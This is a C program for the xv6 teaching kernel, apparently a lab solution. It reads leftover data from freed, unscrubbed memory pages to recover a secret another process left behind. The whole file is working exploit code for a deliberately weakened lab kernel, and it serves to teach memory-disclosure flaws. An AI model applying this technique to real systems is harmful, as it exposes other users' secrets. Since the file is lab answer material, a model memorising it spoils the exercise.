#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// attack: recover the secret left in memory by a previous "secret" run.
//
// secret.c copies "Here it is: <secret>" into heap pages it got from
// sbrk() and exits.  In this lab the kernel does not scrub pages when
// they are freed or reallocated, so the secret survives in physical
// memory.  The kernel's free list is LIFO, and pages freed after the
// secret (secret's page tables, the shell's fork for us, our exec)
// sit on top of it, so we allocate a generous number of pages and
// scan all of them for the marker.

#define NPAGES   64
#define DATASIZE (NPAGES * PGSIZE)
#define MSG      "Here it is: "

// Secrets consist only of letters and digits.
static int
isalnum(char c)
{
  return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z');
}

int
main(int argc, char *argv[])
{
  char *data = sbrk(DATASIZE);
  if (data == SBRK_ERROR) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  int msglen = strlen(MSG);

  for (int i = 0; i + msglen < DATASIZE; i++) {
    if (memcmp(data + i, MSG, msglen) != 0)
      continue;

    // The secret follows the marker and ends at a NUL byte.  Skip
    // stale copies of the bare string literal (empty secret) and any
    // candidate that is not a well-formed, terminated secret.
    char *s = data + i + msglen;
    int max = DATASIZE - (i + msglen);
    int n = 0;
    while (n < max && isalnum(s[n]))
      n++;
    if (n == 0 || n == max || s[n] != '\0')
      continue;

    printf("%s\n", s);
    exit(0);
  }

  exit(1);
}
